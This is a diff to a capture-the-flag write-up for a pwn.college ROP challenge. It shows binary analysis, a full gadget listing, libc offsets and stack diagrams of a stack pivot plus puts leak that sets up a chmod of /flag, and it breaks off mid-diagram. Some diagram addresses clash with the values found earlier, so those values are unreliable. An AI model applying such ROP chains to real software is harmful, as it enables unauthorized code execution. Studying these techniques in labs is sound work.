@@ -6727,7 +6727,7 @@ hacker@return-oriented-programming~putsception-easy:/$ readelf -s /lib/x86_64-li
 
 ### ROP chain: ret2libc
 
-#### Stage 1: Leaking the address of `puts` entry in GOT
+#### Stage 1: Leaking the address of `puts` within Libc
 
 In the first invocation, we leak the address of `puts` in Libc.
 
@@ -6805,7 +6805,7 @@ Function call setup:
 puts(*puts@got)
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> puts@plt
+rip --> puts(*puts@got)
 ═══════════════════════════════════════════════════════════════════════════════════
 
 Stack:
@@ -6821,7 +6821,7 @@ Function call setup:
 puts(*puts@got)
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> puts@plt return
+rip --> puts(*puts@got) return
 ═══════════════════════════════════════════════════════════════════════════════════
 
 Stack:
@@ -6836,7 +6836,7 @@ rip --> _start()
 ```
 
 We would have the address of `puts` within Libc by the end, from which we can calculate the base address of Libc and the address of `chmod` within Libc.
-The call to `_start()` would restart the challenge, and give us a chance to execute the second stage
+The call to `_start()` would restart the challenge, and give us a chance to execute the second stage.
 
 #### Stage 2: Using leaked Libc puts address to calculate Libc chmod address
 
@@ -7651,9 +7651,297 @@ You will need to figure out how to use stack pivoting to execute your full ropch
 
 ```
 
-- [x] Location of the PLT entry of `puts@plt`: `0x401120`
-- [x] Location of the GOT entry of `puts@got`: `0x405028` 
-- [x] Location of the ROP chain within BSS: `0x4150e0`
+Let's pass some input and see how much of it is copied to the stack.
+
+```
+hacker@return-oriented-programming~pivotal-prelude-easy:/$ /challenge/pivotal-prelude-easy 
+###
+### Welcome to /challenge/pivotal-prelude-easy!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+
+This challenge doesn't give you much to work with, so you will have to be resourceful.
+What you'd really like to know is the address of libc.
+In order to get the address of libc, you'll have to leak it yourself.
+An easy way to do this is to do what is known as a `puts(puts)`.
+The outer `puts` is puts@plt: this will actually invoke puts, thus initiating a leak.
+The inner `puts` is puts@got: this contains the address of puts in libc.
+Then you will need to continue executing a new ROP chain with addresses based on that leak.
+One easy way to do that is to just restart the binary by returning to its entrypoint.
+Previous challenges let you write your ROP chain directly onto the stack.
+This challenge is not so nice!
+Your input will be read to the .bss, and only a small part of it will be copied to the stack.
+You will need to figure out how to use stack pivoting to execute your full ropchain!
+aaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbb
+Received 43 bytes! This is potentially 5 gadgets.
+Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
+from within this challenge. You will have to do that by yourself.
+
++--- Printing 5 gadgets of ROP chain at 0x4150e0.
+| 0x6161616161616161: (UNMAPPED MEMORY)
+| 0x6261616161616161: (UNMAPPED MEMORY)
+| 0x6262626262626262: (UNMAPPED MEMORY)
+| 0x6262626262626262: (UNMAPPED MEMORY)
+| 0x6262626262626262: (UNMAPPED MEMORY)
+
+Of course, only 24 bytes of the above ropchain was copied to the stack!
+Let's take a look at just that part of the chain. To execute the rest, you'll have to pivot the stack!
+
++--- Printing 3 gadgets of ROP chain at 0x7ffefc892a08.
+| 0x6161616161616161: (UNMAPPED MEMORY)
+| 0x6261616161616161: (UNMAPPED MEMORY)
+| 0x6262626262626262: (UNMAPPED MEMORY)
+
+Leaving!
+Segmentation fault         /challenge/pivotal-prelude-easy
+```
+
+So the first 24 bytes from our user input are copied from the `.bss` location to the stack. That means we can only execute 3 ROP gadgets. 
+We can try to use a very lean exploit to fit the limitation, or we can perform a stack pivot and obtain more room for our ROP gadgets.
+In this challenge, we will go with the latter approach.
+
+
+We need the following in order to craft the exploit:
+- [ ] Location of the PLT entry of `puts@plt`
+- [ ] Location of the GOT entry of `puts@got`
+- [ ] Location of the unexecuted ROP chain within BSS
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [ ] Address of `_start()`
+
+### Binary Analysis
+
+We already know the location in the BSS to which our ROP payload is saved based on the program's output.
+
+- [ ] Location of the PLT entry of `puts@plt`
+- [ ] Location of the GOT entry of `puts@got`
+- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0`
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [ ] Address of `_start()`
+
+#### `puts@plt` (Procedure Linkage Table entry)
+
+```
+hacker@return-oriented-programming~pivotal-prelude-easy:/$ objdump -d /challenge/pivotal-prelude-easy | grep "<puts@plt>:"
+0000000000401120 <puts@plt>:
+```
+
+- [x] Location of the PLT entry of `puts@plt`: `0x401120` 
+- [ ] Location of the GOT entry of `puts@got`
+- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0`
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [ ] Address of `_start()`
+
+#### `puts@got` (Global Offset Table entry)
+
+```
+hacker@return-oriented-programming~pivotal-prelude-easy:/$ readelf -r /challenge/pivotal-prelude-easy | grep "puts"
+000000405028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
+```
+
+- [x] Location of the PLT entry of `puts@plt`: `0x401120` 
+- [x] Location of the GOT entry of `puts@got`: `0x405028`
+- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0`
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [ ] Address of `_start()`
+
+#### `_start()`
+
+We need find this address so the we can can invoke the program again to execute our second stage of payload.
+
+```
+pwndbg> info address _start 
+Symbol "_start" is at 0x4011d0 in a file compiled without debugging.
+```
+
+- [x] Location of the PLT entry of `puts@plt`: `0x401120` 
+- [x] Location of the GOT entry of `puts@got`: `0x405028`
+- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0`
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [x] Address of `_start()`: `0x4011d0`
+
+#### ROP gadgets
+
+Now, we need to find the relevent ROP gadgets, and their addresses.
+
+```
+hacker@return-oriented-programming~pivotal-prelude-easy:/$ ROPgadget --binary /challenge/pivotal-prelude-easy
+Gadgets information
+============================================================
+0x000000000040232d : adc al, 0 ; add al, ch ; jmp 0x402320
+0x00000000004016a7 : adc eax, 0xc9fffffb ; ret
+0x00000000004011fd : add ah, dh ; nop ; endbr64 ; ret
+0x000000000040232f : add al, ch ; jmp 0x402320
+0x000000000040122b : add bh, bh ; loopne 0x401295 ; nop ; ret
+0x0000000000402143 : add byte ptr [rax + 0x29], cl ; ret 0x8948
+0x000000000040158f : add byte ptr [rax - 0x39], cl ; clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401628
+0x0000000000401524 : add byte ptr [rax - 0x77], cl ; iretd
+0x0000000000401522 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; iretd
+0x0000000000401312 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401490
+0x00000000004023fc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
+0x0000000000401314 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401490
+0x0000000000401594 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401628
+0x000000000040165f : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40168f
+0x00000000004016dd : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401706
+0x0000000000402388 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
+0x0000000000402389 : add byte ptr [rax], al ; add cl, cl ; ret
+0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
+0x000000000040129a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x00000000004023fe : add byte ptr [rax], al ; endbr64 ; ret
+0x00000000004011fc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
+0x0000000000401316 : add byte ptr [rax], al ; jmp 0x401490
+0x0000000000401596 : add byte ptr [rax], al ; jmp 0x401628
+0x0000000000401661 : add byte ptr [rax], al ; jmp 0x40168f
+0x00000000004016df : add byte ptr [rax], al ; jmp 0x401706
+0x000000000040238a : add byte ptr [rax], al ; leave ; ret
+0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
+0x000000000040129b : add byte ptr [rcx], al ; pop rbp ; ret
+0x0000000000401299 : add byte ptr ds:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x000000000040238b : add cl, cl ; ret
+0x000000000040122a : add dil, dil ; loopne 0x401295 ; nop ; ret
+0x0000000000401038 : add dl, dh ; jmp 0x401020
+0x000000000040129c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x000000000040130f : add eax, 0x3da8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401490
+0x0000000000401297 : add eax, 0x3e1b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
+0x0000000000401017 : add esp, 8 ; ret
+0x0000000000401016 : add rsp, 8 ; ret
+0x0000000000401717 : call qword ptr [rax + 0xff3c3c9]
+0x00000000004014ac : call qword ptr [rax - 0x179a72b8]
+0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
+0x0000000000401014 : call rax
+0x0000000000401593 : clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401628
+0x00000000004016dc : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401706
+0x00000000004012b3 : cli ; jmp 0x401240
+0x0000000000401203 : cli ; ret
+0x000000000040240b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
+0x0000000000401311 : cmp eax, 0 ; add byte ptr [rax], al ; jmp 0x401490
+0x00000000004011fb : cmp eax, 0x90f40000 ; endbr64 ; ret
+0x000000000040232c : cwde ; adc al, 0 ; add al, ch ; jmp 0x402320
+0x00000000004016aa : dec ecx ; ret
+0x00000000004012b0 : endbr64 ; jmp 0x401240
+0x0000000000401200 : endbr64 ; ret
+0x00000000004023dc : fisttp word ptr [rax - 0x7d] ; ret
+0x000000000040165e : hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40168f
+0x00000000004011fe : hlt ; nop ; endbr64 ; ret
+0x00000000004016d9 : inc edi ; cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401706
+0x000000000040165b : inc edi ; hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40168f
+0x0000000000401527 : iretd
+0x0000000000401012 : je 0x401016 ; call rax
+0x0000000000401225 : je 0x401230 ; mov edi, 0x405090 ; jmp rax
+0x0000000000401267 : je 0x401270 ; mov edi, 0x405090 ; jmp rax
+0x000000000040103a : jmp 0x401020
+0x00000000004012b4 : jmp 0x401240
+0x0000000000401318 : jmp 0x401490
+0x0000000000401598 : jmp 0x401628
+0x0000000000401663 : jmp 0x40168f
+0x0000000000401649 : jmp 0x401695
+0x00000000004014ef : jmp 0x4016ab
+0x00000000004016e1 : jmp 0x401706
+0x0000000000402331 : jmp 0x402320
+0x000000000040100b : jmp 0x4840104f
+0x000000000040122c : jmp rax
+0x00000000004014af : lea esp, [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
+0x00000000004016ab : leave ; ret
+0x000000000040122d : loopne 0x401295 ; nop ; ret
+0x0000000000401296 : mov byte ptr [rip + 0x3e1b], 1 ; pop rbp ; ret
+0x000000000040165c : mov dword ptr [rbp - 0xc], 0 ; jmp 0x40168f
+0x00000000004016da : mov dword ptr [rbp - 4], 0 ; jmp 0x401706
+0x0000000000401591 : mov dword ptr [rbp - 8], 0 ; jmp 0x401628
+0x0000000000402387 : mov eax, 0 ; leave ; ret
+0x0000000000401227 : mov edi, 0x405090 ; jmp rax
+0x0000000000401590 : mov qword ptr [rbp - 8], 0 ; jmp 0x401628
+0x00000000004011ff : nop ; endbr64 ; ret
+0x0000000000401718 : nop ; leave ; ret
+0x00000000004020e9 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x00000000004020ea : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x00000000004020eb : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x00000000004020ec : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x00000000004020ed : nop ; nop ; nop ; nop ; pop rbp ; ret
+0x00000000004020ee : nop ; nop ; nop ; pop rbp ; ret
+0x00000000004020ef : nop ; nop ; pop rbp ; ret
+0x00000000004020f0 : nop ; pop rbp ; ret
+0x0000000000401228 : nop ; push rax ; add dil, dil ; loopne 0x401295 ; nop ; ret
+0x000000000040122f : nop ; ret
+0x00000000004012ac : nop dword ptr [rax] ; endbr64 ; jmp 0x401240
+0x0000000000401226 : or dword ptr [rdi + 0x405090], edi ; jmp rax
+0x00000000004023ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004014b3 : pop r12 ; pop r13 ; pop rbp ; ret
+0x00000000004023ee : pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004014b5 : pop r13 ; pop rbp ; ret
+0x00000000004023f0 : pop r14 ; pop r15 ; ret
+0x00000000004023f2 : pop r15 ; ret
+0x00000000004023eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004023ef : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004014b6 : pop rbp ; pop rbp ; ret
+0x000000000040129d : pop rbp ; ret
+0x00000000004014b2 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
+0x00000000004023f3 : pop rdi ; ret
+0x00000000004023f1 : pop rsi ; pop r15 ; ret
+0x00000000004023ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004014b4 : pop rsp ; pop r13 ; pop rbp ; ret
+0x0000000000401229 : push rax ; add dil, dil ; loopne 0x401295 ; nop ; ret
+0x000000000040101a : ret
+0x000000000040151f : ret 0x40be
+0x0000000000402223 : ret 0x458b
+0x0000000000402146 : ret 0x8948
+0x00000000004014cf : ret 0x8be
+0x000000000040221e : ret 0xf8c1
+0x000000000040221b : ror byte ptr [rdi], 0x48 ; ret 0xf8c1
+0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
+0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
+0x0000000000401298 : sbb edi, dword ptr [rsi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x000000000040240d : sub esp, 8 ; add rsp, 8 ; ret
+0x000000000040240c : sub rsp, 8 ; add rsp, 8 ; ret
+0x0000000000401310 : test al, 0x3d ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401490
+0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
+0x0000000000401223 : test eax, eax ; je 0x401230 ; mov edi, 0x405090 ; jmp rax
+0x0000000000401265 : test eax, eax ; je 0x401270 ; mov edi, 0x405090 ; jmp rax
+0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
+
+Unique gadgets found: 130
+```
+
+- [x] Location of the PLT entry of `puts@plt`: `0x401120` 
+- [x] Location of the GOT entry of `puts@got`: `0x405028`
+- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0`
+- [ ] Offsets of required Libc functions
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x4023f3`
+   - `pop rsi ; pop r15 ; ret`: `0x4023f1`
+   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x4023ed`
+- [x] Address of `_start()`: `0x4011d0`
+
+#### Libc functions
+
+Finally, lets find the offset of `puts` and `chmod` within Libc. This will be useful in the second stage of our exploit.
+
+```
+hacker@return-oriented-programming~pivotal-prelude-easy:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "puts"
+   195: 0000000000084420   476 FUNC    GLOBAL DEFAULT   15 _IO_puts@@GLIBC_2.2.5
+   430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
+   505: 0000000000124550  1268 FUNC    GLOBAL DEFAULT   15 putspent@@GLIBC_2.2.5
+   692: 0000000000126220   728 FUNC    GLOBAL DEFAULT   15 putsgent@@GLIBC_2.10
+  1160: 0000000000082ce0   384 FUNC    WEAK   DEFAULT   15 fputs@@GLIBC_2.2.5
+```
+
+```
+hacker@return-oriented-programming~pivotal-prelude-easy:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
+   125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
+   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
+  1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
+  2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
+```
+
+- [x] Location of the PLT entry of `puts@plt`: `0x401120` 
+- [x] Location of the GOT entry of `puts@got`: `0x405028`
+- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0 + 16`
 - [x] Offsets of required Libc functions
    - Offset of the `puts` symbol within Libc: `0x84420`
    - Offset of the `chmod` symbol within Libc: `0x10dd80`   
@@ -7661,12 +7949,500 @@ You will need to figure out how to use stack pivoting to execute your full ropch
    - `pop rdi ; ret`: `0x4023f3`
    - `pop rsi ; pop r15 ; ret`: `0x4023f1`
    - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x4023ed`
-- [x] Address of `_start()`: `0x402073`
+- [x] Address of `_start()`: `0x4011d0`
 
 
 ### ROP chain: Stack pivot + ret2libc
 
-tbc.
+#### Stage 1: Performing stack pivot & leaking the address of `puts` within Libc
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffefc892a08 │  00 00 00 00 00 40 23 ed  │ --> ( pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffefc892a10 │  00 00 00 00 00 41 50 f0  │ --> ( b"BBBBBBBB" + b"CCCCCCCC" + ..... )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffefc892a18 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> challenge() return
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffefc892a10 │  00 00 00 00 00 41 50 f0  │ --> ( b"BBBBBBBB" + b"CCCCCCCC" + ..... )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffefc892a18 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x4150f0 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x4150f8 │  43 43 43 43 43 43 43 43  │ ( b"CCCCCCCC" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415100 │  44 44 44 44 44 44 44 44  │ ( b"DDDDDDDD" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415110 │  00 00 00 00 00 40 50 28  │ --> ( puts@got )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415118 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop r13 ; pop r14 ; pop r15 ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x4150f8 │  43 43 43 43 43 43 43 43  │ ( b"CCCCCCCC" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415100 │  44 44 44 44 44 44 44 44  │ ( b"DDDDDDDD" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415110 │  00 00 00 00 00 40 50 28  │ --> ( puts@got )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415118 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+r13: b"BBBBBBBB"
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop r14 ; pop r15 ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x415100 │  44 44 44 44 44 44 44 44  │ ( b"DDDDDDDD" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415110 │  00 00 00 00 00 40 50 28  │ --> ( puts@got )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415118 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+r13: b"BBBBBBBB"
+r14" b"CCCCCCCC"
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop r15 ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415110 │  00 00 00 00 00 40 50 28  │ --> ( puts@got )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415118 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+r13: b"BBBBBBBB"
+r14" b"CCCCCCCC"
+r15: b"DDDDDDDD"
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x415110 │  00 00 00 00 00 40 50 28  │ --> ( puts@got )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415118 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+r13: b"BBBBBBBB"
+r14" b"CCCCCCCC"
+r15: b"DDDDDDDD"
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rdi ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x415118 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x405028
+r13: b"BBBBBBBB"
+r14" b"CCCCCCCC"
+r15: b"DDDDDDDD"
+
+Function call setup:
+puts(*puts@got)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x405028
+r13: b"BBBBBBBB"
+r14" b"CCCCCCCC"
+r15: b"DDDDDDDD"
+
+Function call setup:
+puts(*puts@got)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> puts(*puts@got)
+═══════════════════════════════════════════════════════════════════════════════════
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x415120 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x405028
+r13: b"BBBBBBBB"
+r14" b"CCCCCCCC"
+r15: b"DDDDDDDD"
+
+Function call setup:
+puts(*puts@got)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> puts(*puts@got) return
+═══════════════════════════════════════════════════════════════════════════════════
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x415128 │  .. .. .. .. .. .. .. ..  │ 
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> _start()
+═══════════════════════════════════════════════════════════════════════════════════
+```
+
+#### Stage 2: Using leaked Libc puts address to calculate Libc chmod address
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffefc892a08 │  00 00 00 00 00 40 23 ed  │ --> ( pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffefc892a10 │  00 00 00 00 00 41 50 f0  │ --> ( b"/flag\x00\x00\x00" + b"CCCCCCCC" + ..... )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffefc892a18 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> challenge() return
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffefc892a10 │  00 00 00 00 00 41 50 f0  │ --> ( b"/flag\x00\x00\x00" + b"CCCCCCCC" + ..... )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffefc892a18 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x4150f0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
